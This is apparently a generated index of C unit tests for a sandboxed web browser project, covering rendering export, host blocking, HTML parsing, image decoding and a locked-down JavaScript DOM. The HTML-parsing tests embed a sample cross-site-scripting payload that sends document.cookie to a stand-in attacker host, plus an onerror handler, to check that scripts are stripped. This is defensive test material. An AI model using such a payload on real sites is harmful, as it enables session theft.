- `test_download_pdf_local` (line 193) `static void test_download_pdf_local(void **state)` - *assert_null(strstr(out, "[hidden"));              /* ...nor is the hidden control unlink(path); } static void test_missing_file(void **state) { (void)state; char out[512]; int rc; assert_int_equal(run_freedom("__freedom_missing_file.html", out, sizeof out, &rc), 0); assert_int_equal(rc, 1); } /* --- headless PDF export (--download-pdf, visual-review tooling) ---*
- `test_download_pdf_requires_path` (line 220) `static void test_download_pdf_requires_path(void **state)` - *char args[512]; assert_true((size_t)snprintf(args, sizeof args, "--download-pdf=%s %s", pdf, path) < sizeof args); int rc = -1; assert_int_equal(run_freedom_raw(args, &rc), 0); assert_int_equal(rc, 0); assert_true(is_pdf_file(pdf)); /* a real vector PDF, not a stub unlink(path); unlink(pdf); } /* --download-pdf with no PATH is a usage error (fail closed: never guess a path).*
- `test_download_png_local` (line 228) `static void test_download_png_local(void **state)` - *unlink(path); unlink(pdf); } /* --download-pdf with no PATH is a usage error (fail closed: never guess a path). static void test_download_pdf_requires_path(void **state) { (void)state; int rc = -1; assert_int_equal(run_freedom_raw("--download-pdf examples/sample.html", &rc), 0); assert_int_equal(rc, 2); } /* --- headless PNG export (--download-png, visual-review tooling) ---*
- `test_download_png_images_local` (line 261) `static void test_download_png_images_local(void **state)` - *-download-png --images decodes the page's local images through the confined worker and paints the real bitmap instead of the "image (allowed)" placeholder. Exercises the headless image pipeline end-to-end (render_doc_images -> load_images -> local disk read -> worker decode -> Cairo surface -> free_images); under `make asan` the asan-instrumented freedom subprocess turns any leak/UAF in that path into a failure here. The declared 120x80 clears the tracking-pixel gate so the image is ALLOWed and * actually decoded; the visual-review PNG confirms the pixels (see CLAUDE.md).*
- `test_download_png_requires_path` (line 322) `static void test_download_png_requires_path(void **state)` - *char args[512]; assert_true((size_t)snprintf(args, sizeof args, "--images --download-png=%s %s", png, html_path) < sizeof args); int rc = -1; assert_int_equal(run_freedom_raw(args, &rc), 0); assert_int_equal(rc, 0); assert_true(is_png_file(png)); /* real bitmap, image decoded (not a placeholder-only render) unlink(img); unlink(html_path); unlink(png); } /* --download-png with no PATH is a usage error (fail closed: never guess a path).*
- `test_download_png_negative_zindex_paints_behind_inflow` (line 338) `static void test_download_png_negative_zindex_paints_behind_inflow(void **state)` - *Regression for the M1.1-adjacent paint-order fix in write_doc_png/paint_structured (gui/browser_ui.c, paint_positioned_one): CSS 2.1 Appendix E puts a negative z-index stacking context in a paint-order layer that precedes in-flow content, so it must paint BEHIND, not on top of, an overlapping in-flow box. Before the fix, Stage 2's two passes both ran after the in-flow paint, so #front (in-flow, blue, no explicit position) never covered #behind (position:absolute; z-index:-1; red) even though #behind is meant to sit underneath it -- the sampled pixel came back pure red. Decodes the exported PNG (via image_decode, the project's own PNG * decoder) and asserts the overlap pixel is blue, not red.*
- `blend` (line 393) `* not some other blend (double-composited or wrong alpha). */
static void test_download_png_group...`
- `blend` (line 507) `* visibly different from either input color or an OVER blend (which would show
 * opaque blue). E...`
- `markup` (line 621) `* against an unrotated control render of the identical markup (a 50-char-wide box
 * at x:[24,975...`
- `markup` (line 680) `* unscaled control render of the identical markup (box y:[24,49] at x=500,
 * center y~36.5): y=2...`
- `test_dump_console_shows_output_and_error` (line 739) `static void test_dump_console_shows_output_and_error(void **state)` - *uint8_t br = (uint8_t)(below >> 16), bg = (uint8_t)(below >> 8), bb = (uint8_t)below; uint8_t mr = (uint8_t)(middle >> 16), mg = (uint8_t)(middle >> 8), mb = (uint8_t)middle; assert_true(ar <= 5 && ag <= 5 && ab >= 250); assert_true(br <= 5 && bg <= 5 && bb >= 250); assert_true(mr <= 5 && mg <= 5 && mb >= 250); img_pixels_free(&px); unlink(path); unlink(png); } /* --- headless console (Freebug --dump-console) --- /* --dump-console runs the page's JS and prints console.* output + uncaught errors.*
- `test_no_dump_console_without_flag` (line 774) `static void test_no_dump_console_without_flag(void **state)` - *size_t got = fread(out, 1, sizeof out - 1, o); out[got] = '\0'; fclose(o); assert_non_null(strstr(out, "Freebug console")); assert_non_null(strstr(out, "[log] LOGMARK 2"));        /* console.log + computed arg assert_non_null(strstr(out, "[warn] WARNMARK"));         /* console.warn assert_non_null(strstr(out, "[error] "));               /* uncaught ReferenceError assert_non_null(strstr(out, "boomUndefined"));           /* error names the missing fn unlink(path); } /* Plain headless (no --dump-console) does not run JS and prints no console section.*
- `test_dump_dom_prints_render_tree` (line 799) `static void test_dump_dom_prints_render_tree(void **state)` - *-dump-dom prints the agent-readable render tree (header + per-block lines) instead * of the normal text render, and does not run JS.*
- `ballooned` (line 832) `* ballooned (body + wrapper re-opened per child) and the LAST wrapper piece
 * became the contain...`
- `test_rejects_http_url` (line 948) `static void test_rejects_http_url(void **state)` - *The relative panel is in flow: at least one box, and no positioned box left it * at the page bottom (the grey-stripe bug had npositioned pushing it away). assert_non_null(strstr(out, "nbox=1")); assert_non_null(strstr(out, "npositioned=0")); unlink(path); } /* --- network policy ---*
- `main` (line 958) `int main(void)` - *unlink(path); } /* --- network policy --- static void test_rejects_http_url(void **state) { (void)state; char out[512]; int rc; assert_int_equal(run_freedom("http://example.com", out, sizeof out, &rc), 0); assert_int_equal(rc, 1); } /* --- suite ---*

**Macros:**
- `_POSIX_C_SOURCE` (line 10)
- `FREEDOM_BIN` (line 25)
- `OUT_FILE` (line 27)
- `ERR_FILE` (line 28)

#### `test_hls.c`
**Path:** `tests/test_hls.c`

**Functions:**
- `test_not_m3u8_returns_parse_error` (line 14) `static void test_not_m3u8_returns_parse_error(void **state)` - *include "hls.h"*
- `test_empty_m3u8_is_ok` (line 21) `static void test_empty_m3u8_is_ok(void **state)`
- `test_single_segment` (line 30) `static void test_single_segment(void **state)`
- `test_multiple_segments` (line 45) `static void test_multiple_segments(void **state)`
- `test_target_duration_is_parsed` (line 67) `static void test_target_duration_is_parsed(void **state)`
- `test_variant_playlist_detected` (line 82) `static void test_variant_playlist_detected(void **state)`
- `test_variant_playlist_collects_variants` (line 96) `static void test_variant_playlist_collects_variants(void **state)`
- `test_multi_variant_collects_all` (line 113) `static void test_multi_variant_collects_all(void **state)`
- `test_select_variant_highest_bandwidth_no_limit` (line 134) `static void test_select_variant_highest_bandwidth_no_limit(void **state)`
- `test_select_variant_respects_max_dimensions` (line 151) `static void test_select_variant_respects_max_dimensions(void **state)`
- `test_select_variant_empty_returns_error` (line 169) `static void test_select_variant_empty_returns_error(void **state)`
- `test_resolve_url_absolute_passthrough` (line 179) `static void test_resolve_url_absolute_passthrough(void **state)`
- `test_resolve_url_relative` (line 189) `static void test_resolve_url_relative(void **state)`
- `test_resolve_url_deep_relative` (line 199) `static void test_resolve_url_deep_relative(void **state)`
- `test_handles_windows_line_endings` (line 208) `static void test_handles_windows_line_endings(void **state)`
- `main` (line 218) `int main(void)`

#### `test_hostblock.c`
**Path:** `tests/test_hostblock.c`

**Functions:**
- `test_free_null_idempotent` (line 31) `static void test_free_null_idempotent(void **state)`
- `test_count_null_set` (line 36) `static void test_count_null_set(void **state)`
- `test_load_null_args` (line 44) `static void test_load_null_args(void **state)` - *} static void test_free_null_idempotent(void **state) { (void)state; hb_free(NULL);  /* must not crash } static void test_count_null_set(void **state) { (void)state; assert_int_equal(hb_count(NULL, HB_LIST_BLOCK), 0); assert_int_equal(hb_count(NULL, HB_LIST_ALLOW), 0); } /* --- load: argument validation ---*
- `test_hosts_line_drops_ip` (line 54) `static void test_hosts_line_drops_ip(void **state)` - *assert_int_equal(hb_count(NULL, HB_LIST_ALLOW), 0); } /* --- load: argument validation --- static void test_load_null_args(void **state) { (void)state; hb_set *s = hb_new(); assert_int_equal(hb_load(NULL, "example.com", HB_LIST_BLOCK), HB_ERR_NULL_ARG); assert_int_equal(hb_load(s, NULL, HB_LIST_BLOCK), HB_ERR_NULL_ARG); hb_free(s); } /* --- load: /etc/hosts format parsing ---*
- `test_various_ip_tokens_ignored` (line 63) `static void test_various_ip_tokens_ignored(void **state)`
- `test_bare_domain_per_line` (line 72) `static void test_bare_domain_per_line(void **state)`
- `test_comments_and_blanks` (line 82) `static void test_comments_and_blanks(void **state)`
- `test_multiple_tokens_per_line` (line 98) `static void test_multiple_tokens_per_line(void **state)`
- `test_no_trailing_newline` (line 106) `static void test_no_trailing_newline(void **state)`
- `test_lowercased` (line 117) `static void test_lowercased(void **state)` - *assert_int_equal(hb_count(s, HB_LIST_BLOCK), 3); hb_free(s); } static void test_no_trailing_newline(void **state) { (void)state; hb_set *s = hb_new(); assert_int_equal(hb_load(s, "0.0.0.0 last.com", HB_LIST_BLOCK), HB_OK); assert_int_equal(hb_count(s, HB_LIST_BLOCK), 1); assert_int_equal(hb_check(s, "last.com"), HB_BLOCK); hb_free(s); } /* --- load: normalisation and validation ---*
- `test_trailing_dot_trimmed` (line 127) `static void test_trailing_dot_trimmed(void **state)`
- `test_invalid_tokens_skipped` (line 138) `static void test_invalid_tokens_skipped(void **state)`
- `test_oversize_token_skipped` (line 154) `static void test_oversize_token_skipped(void **state)`
- `test_underscore_and_hyphen_valid` (line 165) `static void test_underscore_and_hyphen_valid(void **state)`
- `test_dedup_and_accumulate` (line 173) `static void test_dedup_and_accumulate(void **state)`
- `test_lists_independent` (line 184) `static void test_lists_independent(void **state)`
- `test_block_covers_subdomains` (line 196) `static void test_block_covers_subdomains(void **state)` - *hb_free(s); } static void test_lists_independent(void **state) { (void)state; hb_set *s = hb_new(); assert_int_equal(hb_load(s, "a.com\nb.com\n", HB_LIST_BLOCK), HB_OK); assert_int_equal(hb_load(s, "c.com\n", HB_LIST_ALLOW), HB_OK); assert_int_equal(hb_count(s, HB_LIST_BLOCK), 2); assert_int_equal(hb_count(s, HB_LIST_ALLOW), 1); hb_free(s); } /* --- check: decision logic ---*
- `test_allow_wins_and_covers_subdomains` (line 209) `static void test_allow_wins_and_covers_subdomains(void **state)`
- `test_no_lists_allows` (line 223) `static void test_no_lists_allows(void **state)`
- `test_is_allowlisted` (line 230) `static void test_is_allowlisted(void **state)`
- `test_check_fail_open_edges` (line 251) `static void test_check_fail_open_edges(void **state)`
- `main` (line 265) `int main(void)`

#### `test_hostedit.c`
**Path:** `tests/test_hostedit.c`
**File Doc:** *include <setjmp.h> include <stdarg.h> include <stddef.h> include <stdint.h> include <string.h>  include <cmocka.h>  include "hostedit.h"*

**Functions:**
- `test_make_line_lowercases` (line 10) `static void test_make_line_lowercases(void **state)` - *include "hostedit.h"*
- `test_make_line_plain_host` (line 17) `static void test_make_line_plain_host(void **state)`
- `test_make_line_rejects_path_scheme_garbage` (line 24) `static void test_make_line_rejects_path_scheme_garbage(void **state)`
- `test_make_line_rejects_bad_labels` (line 35) `static void test_make_line_rejects_bad_labels(void **state)`
- `test_make_line_null_and_range` (line 46) `static void test_make_line_null_and_range(void **state)`
- `test_make_line_single_label_ok` (line 55) `static void test_make_line_single_label_ok(void **state)`
- `test_text_has_host` (line 62) `static void test_text_has_host(void **state)`
- `test_suggest_prefix_first` (line 75) `static void test_suggest_prefix_first(void **state)`
- `test_suggest_case_insensitive_and_dedup` (line 91) `static void test_suggest_case_insensitive_and_dedup(void **state)`
- `test_suggest_empty_query_and_cap` (line 100) `static void test_suggest_empty_query_and_cap(void **state)`
- `main` (line 113) `int main(void)`

#### `test_html_parse.c`
**Path:** `tests/test_html_parse.c`

**Functions:**
- `test_config_default_is_secure` (line 36) `static void test_config_default_is_secure(void **state)` - *static const char DOC_SIMPLE[] = "<!DOCTYPE html><html><head><title>Hello Title</title></head>" "<body><p>Hello World</p></body></html>"; static const char DOC_SCRIPT[] = "<html><body><p>visible</p>" "<script>document.location='http://evil.example/'+document.cookie;</script>" "</body></html>"; static const char DOC_HANDLER[] = "<html><body><img src=x onerror=\"steal()\"><a href=# onclick=\"x()\">k</a></body></html>"; /* --- config / validator ---*
- `test_validate_rejects_null` (line 44) `static void test_validate_rejects_null(void **state)`
- `test_validate_rejects_empty` (line 50) `static void test_validate_rejects_empty(void **state)`
- `test_validate_rejects_oversize` (line 56) `static void test_validate_rejects_oversize(void **state)`
- `test_validate_accepts_within_cap` (line 63) `static void test_validate_accepts_within_cap(void **state)`
- `test_parse_rejects_null_args` (line 71) `static void test_parse_rejects_null_args(void **state)` - *static void test_validate_rejects_oversize(void **state) { (void)state; hp_config c = hp_config_default(); c.max_bytes = 8; assert_int_equal(hp_validate_input("123456789", 9, &c), HP_ERR_TOO_LARGE); } static void test_validate_accepts_within_cap(void **state) { (void)state; hp_config c = hp_config_default(); assert_int_equal(hp_validate_input(LIT(DOC_SIMPLE), &c), HP_OK); } /* --- parse: argument guards ---*
- `test_parse_rejects_oversize` (line 79) `static void test_parse_rejects_oversize(void **state)`
- `test_parse_simple_document` (line 90) `static void test_parse_simple_document(void **state)` - *assert_int_equal(hp_parse(NULL, 5, &c, &doc), HP_ERR_NULL_ARG); assert_int_equal(hp_parse("x", 1, &c, NULL), HP_ERR_NULL_ARG); } static void test_parse_rejects_oversize(void **state) { (void)state; hp_config c = hp_config_default(); c.max_bytes = 4; hp_document *doc = NULL; assert_int_equal(hp_parse(LIT(DOC_SIMPLE), &c, &doc), HP_ERR_TOO_LARGE); assert_null(doc); } /* --- parse: structure & extraction ---*
- `test_scripts_stripped_by_default` (line 115) `static void test_scripts_stripped_by_default(void **state)` - *assert_non_null(title); assert_string_equal(title, "Hello Title"); hp_free(title); size_t blen = 0; char *text = hp_extract_text(doc, &blen); assert_non_null(text); assert_non_null(strstr(text, "Hello World")); hp_free(text); hp_document_free(doc); } /* --- script isolation (core Hito 2 guarantee) ---*
- `test_scripts_kept_when_disabled` (line 130) `static void test_scripts_kept_when_disabled(void **state)`
- `test_event_handlers_stripped_by_default` (line 140) `static void test_event_handlers_stripped_by_default(void **state)`
- `test_event_handlers_kept_when_disabled` (line 149) `static void test_event_handlers_kept_when_disabled(void **state)`
- `test_extract_script_list_skips_non_js_type` (line 227) `static void test_extract_script_list_skips_non_js_type(void **state)` - *A classic script runs only when its type is absent/empty or a JavaScript MIME type. Template/data blocks (text/x-jquery-tmpl, text/html, text/template) are NOT executed -- running them throws a SyntaxError on their markup (Slashdot's * "#each" errors). Fail closed: only a recognized JS type survives.*
- `test_extract_script_list_empty` (line 256) `static void test_extract_script_list_empty(void **state)` - *assert_int_equal(hp_parse(LIT(H), &c, &doc), HP_OK); size_t n = 0; hp_script *s = hp_extract_script_list(doc, &n); assert_non_null(s); assert_int_equal((unsigned long)n, 3UL);   /* only the three JS scripts, in order assert_string_equal(s[0].text, "var a=1;"); assert_string_equal(s[1].text, "var b=2;"); assert_string_equal(s[2].text, "var c=3;"); hp_free_scripts(s, n); hp_document_free(doc); } /* No inline scripts => NULL list and zero count (never a bogus empty buffer).*
- `test_extract_stylesheets_basic` (line 303) `static void test_extract_stylesheets_basic(void **state)` - *Two applicable <link rel=stylesheet> come back as their RAW hrefs in document * order; noise (rel=icon, link without href, a <style> element) is skipped.*
- `test_extract_stylesheets_rel_tokens` (line 330) `static void test_extract_stylesheets_rel_tokens(void **state)` - *rel matches by whitespace-separated token, case-insensitively: "STYLESHEET" applies; "alternate stylesheet" is an inactive alternate sheet (skipped, fail-closed); a rel merely CONTAINING the word inside a longer token does not * match.*
- `test_extract_stylesheets_none_and_null` (line 380) `static void test_extract_stylesheets_none_and_null(void **state)` - *No applicable links => NULL with count 0; NULL doc likewise; the releaser is * idempotent on NULL.*
- `test_extract_stylesheets_caps` (line 397) `static void test_extract_stylesheets_caps(void **state)` - *hp_document *doc = NULL; assert_int_equal(hp_parse(LIT("<html><body><p>hi</p></body></html>"), &c, &doc), HP_OK); size_t n = 123; char **s = hp_extract_stylesheet_hrefs(doc, &n); assert_null(s); assert_int_equal((unsigned long)n, 0UL); hp_document_free(doc); n = 123; assert_null(hp_extract_stylesheet_hrefs(NULL, &n)); assert_int_equal((unsigned long)n, 0UL); hp_free_stylesheet_hrefs(NULL, 0); } /* Fail-closed anti-DoS: more links than HP_MAX_STYLESHEETS returns the cap.*
- `test_parse_malformed_does_not_crash` (line 423) `static void test_parse_malformed_does_not_crash(void **state)` - *} hp_config c = hp_config_default(); hp_document *doc = NULL; assert_int_equal(hp_parse(html, off, &c, &doc), HP_OK); size_t n = 0; char **s = hp_extract_stylesheet_hrefs(doc, &n); assert_non_null(s); assert_int_equal((unsigned long)n, (unsigned long)HP_MAX_STYLESHEETS); hp_free_stylesheet_hrefs(s, n); hp_document_free(doc); free(html); } /* --- robustness ---*
- `test_free_null_and_double` (line 435) `static void test_free_null_and_double(void **state)` - */* --- robustness --- static void test_parse_malformed_does_not_crash(void **state) { (void)state; hp_config c = hp_config_default(); hp_document *doc = NULL; static const char junk[] = "<div><span><<<>>>\x01\x02 unclosed <b><i>"; assert_int_equal(hp_parse(junk, sizeof(junk) - 1, &c, &doc), HP_OK); assert_non_null(doc); hp_document_free(doc); } /* --- memory safety ---*
- `main` (line 445) `int main(void)`

**Macros:**
- `LIT` (line 20)

#### `test_image_decode.c`
**Path:** `tests/test_image_decode.c`

**Functions:**
- `px` (line 64) `static uint32_t px(const img_pixels *p, uint32_t x, uint32_t y)`
- `test_sniff_png` (line 74) `static void test_sniff_png(void **state)` - *0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xda, 0x00, 0x0c, 0x03, 0x01, 0x00, 0x02, 0x11, 0x03, 0x11, 0x00, 0x3f, 0x00, 0x3a, 0x03, 0x15, 0x4d, 0xff, 0xd9 }; static uint32_t px(const img_pixels *p, uint32_t x, uint32_t y) { const uint8_t *row = p->data + (size_t)y * p->stride; const uint8_t *q = row + (size_t)x * 4u; /* Little-endian ARGB32: bytes B,G,R,A -> 0xAARRGGBB. return (uint32_t)q[0] | ((uint32_t)q[1] << 8) | ((uint32_t)q[2] << 16) | ((uint32_t)q[3] << 24); } /* --- img_sniff ---*
- `test_sniff_unsupported` (line 79) `static void test_sniff_unsupported(void **state)`
- `test_dimensions_from_ihdr` (line 88) `static void test_dimensions_from_ihdr(void **state)` - *static void test_sniff_png(void **state) { (void)state; assert_int_equal(img_sniff(PNG_2x2, sizeof PNG_2x2), IMG_FMT_PNG); } static void test_sniff_unsupported(void **state) { (void)state; /* Garbage and too-short buffers sniff as UNKNOWN. assert_int_equal(img_sniff(NULL, 0), IMG_FMT_UNKNOWN); assert_int_equal(img_sniff(PNG_2x2, 4), IMG_FMT_UNKNOWN); /* too short for the magic } /* --- img_png_dimensions ---*
- `test_dimensions_truncated` (line 96) `static void test_dimensions_truncated(void **state)`
- `test_dimensions_non_png` (line 103) `static void test_dimensions_non_png(void **state)`
- `test_dimensions_null` (line 110) `static void test_dimensions_null(void **state)`
- `test_dimensions_ok_bounds` (line 119) `static void test_dimensions_ok_bounds(void **state)` - *(void)state; uint32_t w = 0, h = 0; const uint8_t junk[16] = {0}; assert_int_equal(img_png_dimensions(junk, sizeof junk, &w, &h), IMG_ERR_FORMAT); } static void test_dimensions_null(void **state) { (void)state; uint32_t w = 0; assert_int_equal(img_png_dimensions(NULL, 0, &w, &w), IMG_ERR_NULL_ARG); assert_int_equal(img_png_dimensions(PNG_2x2, sizeof PNG_2x2, NULL, &w), IMG_ERR_NULL_ARG); } /* --- img_dimensions_ok (anti-DoS) ---*
- `test_fit_landscape_into_square` (line 135) `static void test_fit_landscape_into_square(void **state)` - *(void)state; assert_int_equal(img_dimensions_ok(1, 1), 1); assert_int_equal(img_dimensions_ok(IMG_MAX_DIM, 1), 1); assert_int_equal(img_dimensions_ok(0, 1), 0);          /* zero area assert_int_equal(img_dimensions_ok(1, 0), 0); assert_int_equal(img_dimensions_ok(IMG_MAX_DIM + 1, 1), 0); /* side cap assert_int_equal(img_dimensions_ok(1, IMG_MAX_DIM + 1), 0); /* Within per-side cap but over the area cap. assert_int_equal(img_dimensions_ok(IMG_MAX_DIM, IMG_MAX_DIM), 0); /* A pathological pair that would overflow width*height. assert_int_equal(img_dimensions_ok(0xFFFFFFFFu, 0xFFFFFFFFu), 0); } /* --- img_fit (aspect-preserving) ---*
- `test_fit_portrait_into_box` (line 144) `static void test_fit_portrait_into_box(void **state)`
- `test_fit_degenerate` (line 153) `static void test_fit_degenerate(void **state)`
- `test_decode_dimensions_and_stride` (line 165) `static void test_decode_dimensions_and_stride(void **state)` - *assert_true(h > 99.9 && h < 100.1); } static void test_fit_degenerate(void **state) { (void)state; double w = 1, h = 1; img_fit(0, 10, 100.0, 100.0, &w, &h); assert_true(w == 0.0 && h == 0.0); w = 1; h = 1; img_fit(10, 10, 0.0, 100.0, &w, &h); assert_true(w == 0.0 && h == 0.0); } /* --- img_decode_png ---*
- `test_decode_pixels_premultiplied` (line 177) `static void test_decode_pixels_premultiplied(void **state)`
- `test_decode_rejects_non_png` (line 189) `static void test_decode_rejects_non_png(void **state)`
- `test_decode_rejects_truncated` (line 199) `static void test_decode_rejects_truncated(void **state)`
- `test_decode_null_args` (line 209) `static void test_decode_null_args(void **state)`
- `test_pixels_free_idempotent` (line 217) `static void test_pixels_free_idempotent(void **state)`
- `test_format_name` (line 226) `static void test_format_name(void **state)`
- `test_sniff_jpeg` (line 235) `static void test_sniff_jpeg(void **state)` - *memset(&p, 0, sizeof p); img_pixels_free(&p); img_pixels_free(&p); img_pixels_free(NULL); } static void test_format_name(void **state) { (void)state; assert_string_equal(img_format_name(IMG_FMT_PNG), "png"); assert_string_equal(img_format_name(IMG_FMT_JPEG), "jpeg"); assert_string_equal(img_format_name(IMG_FMT_UNKNOWN), "unknown"); } /* --- JPEG ---*
- `test_decode_jpeg_dimensions_and_alpha` (line 243) `static void test_decode_jpeg_dimensions_and_alpha(void **state)`
- `test_decode_dispatch_routes_jpeg_and_png` (line 266) `static void test_decode_dispatch_routes_jpeg_and_png(void **state)`
- `test_decode_dispatch_rejects_unknown` (line 278) `static void test_decode_dispatch_rejects_unknown(void **state)`
- `test_decode_jpeg_rejects_truncated` (line 286) `static void test_decode_jpeg_rejects_truncated(void **state)`
- `test_decode_jpeg_rejects_non_jpeg` (line 294) `static void test_decode_jpeg_rejects_non_jpeg(void **state)`
- `test_decode_jpeg_null_args` (line 301) `static void test_decode_jpeg_null_args(void **state)`
- `test_sniff_gif` (line 355) `static void test_sniff_gif(void **state)`
- `test_decode_gif_pixels` (line 362) `static void test_decode_gif_pixels(void **state)`
- `test_decode_gif_transparency` (line 377) `static void test_decode_gif_transparency(void **state)`
- `test_decode_gif_interlaced` (line 389) `static void test_decode_gif_interlaced(void **state)`
- `test_decode_gif_animated_first_frame` (line 404) `static void test_decode_gif_animated_first_frame(void **state)`
- `test_decode_gif_fail_closed` (line 413) `static void test_decode_gif_fail_closed(void **state)`
- `test_decode_dispatch_routes_gif` (line 429) `static void test_decode_dispatch_routes_gif(void **state)`
- `test_sniff_webp` (line 447) `static void test_sniff_webp(void **state)`
- `test_decode_webp_dimensions_and_pixels` (line 453) `static void test_decode_webp_dimensions_and_pixels(void **state)`
- `test_decode_webp_fail_closed` (line 470) `static void test_decode_webp_fail_closed(void **state)`
- `test_decode_dispatch_routes_webp` (line 482) `static void test_decode_dispatch_routes_webp(void **state)`
- `main` (line 491) `int main(void)`

#### `test_js_dom.c`
**Path:** `tests/test_js_dom.c`

**Functions:**
- `setup` (line 44) `static int setup(void **state)`
- `teardown` (line 55) `static int teardown(void **state)`
- `run` (line 69) `static js_status run(fixture *f, const char *src, js_result *r)` - *Evaluates src in the fixture context and returns the result string (owned by * the caller-provided js_result, freed by the caller).*
- `test_install_null_args` (line 83) `static void test_install_null_args(void **state)` - *static js_status run(fixture *f, const char *src, js_result *r) { return js_eval(f->ctx, src, strlen(src), r); } #define EXPECT(f, src, expected)                                   \ do {                                                           \ js_result _r;                                              \ assert_int_equal(run((f), (src), &_r), JS_OK);             \ assert_non_null(_r.value);                                 \ assert_string_equal(_r.value, (expected));                 \ js_result_free(&_r);                                       \ } while (0) /* --- install ---*
- `test_get_element_by_id` (line 94) `static void test_get_element_by_id(void **state)` - *} while (0) /* --- install --- static void test_install_null_args(void **state) { (void)state; js_context *ctx = NULL; assert_int_equal(js_context_new(NULL, &ctx), JS_OK); assert_int_equal(jd_install(ctx, NULL, NULL), JD_ERR_NULL_ARG); assert_int_equal(jd_install(NULL, NULL, NULL), JD_ERR_NULL_ARG); js_context_free(ctx); } /* --- queries from JS ---*
- `test_node_count` (line 102) `static void test_node_count(void **state)`
- `test_by_class_and_tag` (line 107) `static void test_by_class_and_tag(void **state)`
- `test_navigation` (line 115) `static void test_navigation(void **state)`
- `test_attributes` (line 125) `static void test_attributes(void **state)`
- `test_document_order` (line 132) `static void test_document_order(void **state)`
- `test_invalid_handles` (line 141) `static void test_invalid_handles(void **state)` - *fixture *f = (fixture *)*state; EXPECT(f, "dom.getAttribute(dom.getElementById('main'),'class')", "container box"); EXPECT(f, "dom.getAttribute(dom.getElementById('main'),'data-x')", "null"); } static void test_document_order(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "dom.precedes(dom.getElementById('main'), dom.getElementById('go'))", "true"); } /* --- robustness: bogus handles never crash, just yield null ---*
- `test_methods_are_frozen` (line 151) `static void test_methods_are_frozen(void **state)` - *"true"); } /* --- robustness: bogus handles never crash, just yield null --- static void test_invalid_handles(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "dom.tagName(99999)", "null"); EXPECT(f, "dom.tagName(-1)", "null"); EXPECT(f, "dom.firstChild(99999)", "null"); EXPECT(f, "dom.getAttribute(99999,'id')", "null"); } /* --- the API cannot be hijacked ---*
- `test_no_io_with_dom` (line 162) `static void test_no_io_with_dom(void **state)` - *} /* --- the API cannot be hijacked --- static void test_methods_are_frozen(void **state) { fixture *f = (fixture *)*state; /* Reassigning a method must not take effect (non-writable). EXPECT(f, "try{dom.getElementById=1}catch(e){}; typeof dom.getElementById", "function"); /* The sealed object rejects new properties. EXPECT(f, "try{dom.injected=1}catch(e){}; typeof dom.injected", "undefined"); } /* --- still no I/O even with dom installed ---*
- `test_document_shim_present` (line 170) `static void test_document_shim_present(void **state)` - *"function"); /* The sealed object rejects new properties. EXPECT(f, "try{dom.injected=1}catch(e){}; typeof dom.injected", "undefined"); } /* --- still no I/O even with dom installed --- static void test_no_io_with_dom(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "typeof require + typeof fetch + typeof std", "undefinedundefinedundefined"); } /* --- live DOM (Hito 20b): the `document` shim mutates the tree safely ---*
- `test_query_selector_from_js` (line 177) `static void test_query_selector_from_js(void **state)`
- `test_element_matches_closest_query_from_js` (line 191) `static void test_element_matches_closest_query_from_js(void **state)`
- `test_node_identity_is_cached` (line 201) `static void test_node_identity_is_cached(void **state)`
- `test_element_traversal` (line 208) `static void test_element_traversal(void **state)`
- `test_classlist_backs_class_attr` (line 217) `static void test_classlist_backs_class_attr(void **state)`
- `test_document_fragment_reparents` (line 227) `static void test_document_fragment_reparents(void **state)`
- `jQuery` (line 242) `* page that ships jQuery (Slashdot). The fragment must be complete enough that the
 * detection c...`
- `test_modern_globals_do_not_throw` (line 260) `static void test_modern_globals_do_not_throw(void **state)`
- `EXPECT` (line 266) `EXPECT(f, "typeof (new MutationObserver(function()`
- `bundle` (line 281) `* library bundle (DuckDuckGo's l.js "cannot read property createElement of
 * undefined"). This l...`
- `methods` (line 297) `* backed by the sealed dom methods (this element's own attributes only). */
static void test_elem...`
- `test_intl_stub_does_not_throw` (line 316) `static void test_intl_stub_does_not_throw(void **state)` - *Intl stub: QuickJS-ng builds without ICU, so Intl is otherwise undefined and any locale-aware script (DuckDuckGo's wplv.js: "Intl is not defined") dies. The stub * is identity-neutral (fixed en-US-ish behaviour, no real locale/timezone leak).*
- `test_url_constructor_parses_components` (line 329) `static void test_url_constructor_parses_components(void **state)` - *WHATWG URL: identity-safe, pure string parsing (no network/IO). This was * Slashdot's first JS error (ReferenceError: URL is not defined).*
- `test_url_search_params` (line 352) `static void test_url_search_params(void **state)` - *EXPECT(f, "new URL('https://a.b.com/p?x=1#frag').hash", "#frag"); EXPECT(f, "new URL('https://a.b.com/p').origin", "https://a.b.com"); /* A bare path (no host) with no default host defaults to root pathname. EXPECT(f, "new URL('/foo/bar', 'https://h.com/x/y').href", "https://h.com/foo/bar"); EXPECT(f, "new URL('sub/page?z=9', 'https://h.com/a/b').pathname", "/a/sub/page"); /* searchParams is a live view; toString re-serializes. EXPECT(f, "new URL('https://h.com/?a=1&b=2').searchParams.get('b')", "2"); /* Relative with no base throws TypeError (WHATWG). EXPECT(f, "var t='ok'; try{ new URL('not a url'); t='no-throw'; }" "catch(e){ t=e.constructor.name; } t", "TypeError"); } /* WHATWG URLSearchParams: identity-safe query parsing/encoding.*
- `test_settimeout_chains_across_rounds` (line 376) `static void test_settimeout_chains_across_rounds(void **state)`
- `test_document_title_set_reflects_in_tree` (line 383) `static void test_document_title_set_reflects_in_tree(void **state)`
- `test_set_text_content_reflects_in_tree` (line 397) `static void test_set_text_content_reflects_in_tree(void **state)`
- `test_set_text_content_detach_is_memory_safe` (line 408) `static void test_set_text_content_detach_is_memory_safe(void **state)`
- `test_document_is_not_io` (line 423) `static void test_document_is_not_io(void **state)`
- `test_create_append_renders_in_tree` (line 432) `static void test_create_append_renders_in_tree(void **state)` - */* 'go' is detached but alive: its tag still reads safely. assert_string_equal(r.value, "BUTTON"); js_result_free(&r); EXPECT(f, "document.getElementById('main').textContent", "X"); } static void test_document_is_not_io(void **state) { fixture *f = (fixture *)*state; /* The shim adds no I/O surface; console is a no-op, window is the global. EXPECT(f, "typeof window + (window===globalThis)", "objecttrue"); EXPECT(f, "typeof XMLHttpRequest + typeof fetch", "undefinedundefined"); } /* --- live DOM construction (Hito 20c) ---*
- `test_set_attribute_makes_queryable` (line 448) `static void test_set_attribute_makes_queryable(void **state)`
